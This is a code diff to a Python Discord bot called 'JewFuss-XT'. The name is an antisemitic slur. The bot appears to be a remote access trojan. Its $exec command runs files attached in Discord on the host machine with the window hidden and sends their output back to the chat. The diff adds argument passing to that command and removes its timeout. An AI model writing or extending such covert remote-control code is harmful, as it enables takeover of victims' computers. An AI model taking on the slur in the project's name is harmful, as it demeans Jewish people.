@@ -30,6 +30,7 @@ import ctypes
 import psutil
 import shutil
 import winreg
+import shlex
 import glob
 import json
 import time
@@ -45,7 +46,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -750,8 +751,8 @@ async def ps(ctx, *, command: str = None):
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
 
-@bot.command(name="exec", help="Runs attached file and returns console output, format $exec [timeout (optional seconds)]", usage="$exec [timeout]")
-async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
+@bot.command(name="exec", help="Runs attached file and returns console output, format $exec [args]", usage="$exec [args]")
+async def exec_attachment(ctx: commands.Context, *, args: str = ""):
     if not ctx.message.attachments or len(ctx.message.attachments) != 1:
         await ctx.send("Attach exactly one file.")
         return
@@ -790,10 +791,14 @@ async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
     else:
         cmd = [dest]
 
+    if args.strip():
+        cmd.extend(shlex.split(args))
+
     cmd_show = subprocess.list2cmdline(cmd)
     status = await ctx.send(
         f"> Executing `{os.path.basename(dest)}`\n"
-        f"> * Timeout: {timeout if timeout else 'none'}s\n"
+        f"> * Full command: `{cmd_show}`"
+        f"> * Args: `{args or '(none)'}`\n"
         f"> React 🛑 to stop."
     )
     try:
@@ -806,10 +811,6 @@ async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
     si.wShowWindow = 0
 
     try:
-        si = subprocess.STARTUPINFO()
-        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        si.wShowWindow = 0
-
         proc = subprocess.Popen(
             cmd,
             cwd=exec_dir,
@@ -823,12 +824,13 @@ async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
             startupinfo=si,
             close_fds=True,
         )
-
+        
     except FileNotFoundError:
         try: await status.delete()
         except Exception: pass
         await ctx.send(f"Interpreter not found for `{ext}`.")
         return
+    
     except Exception as e:
         try: await status.delete()
         except Exception: pass
@@ -854,21 +856,12 @@ async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
             check=lambda r, u: (r.message.id == status.id and str(r.emoji) == "🛑" and not u.bot),
         )
     )
-    timeout_task = asyncio.create_task(asyncio.sleep(timeout)) if timeout and timeout > 0 else None
-    proc_wait_future = loop.run_in_executor(None, proc.wait)  # <-- Future, not create_task
-
-    pending = {reaction_task, proc_wait_future}
-    if timeout_task: pending.add(timeout_task)
-    done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
+    
+    proc_wait_future = loop.run_in_executor(None, proc.wait)
+    done, _ = await asyncio.wait({reaction_task, proc_wait_future}, return_when=asyncio.FIRST_COMPLETED)
 
     if reaction_task in done and not proc_wait_future.done():
         stop_reason = "Stopped by reaction"
-        try:
-            subprocess.run(["taskkill", "/PID", str(proc.pid), "/T", "/F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except Exception:
-            pass
-    elif timeout_task and timeout_task in done and not proc_wait_future.done():
-        stop_reason = f"Stopped by timeout ({timeout}s)"
         try:
             subprocess.run(["taskkill", "/PID", str(proc.pid), "/T", "/F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except Exception:
@@ -878,8 +871,6 @@ async def exec_attachment(ctx: commands.Context, timeout: int | None = None):
         await proc_wait_future
     if not reaction_task.done():
         reaction_task.cancel()
-    if timeout_task and not timeout_task.done():
-        timeout_task.cancel()
 
     try:
         t.join(timeout=2)
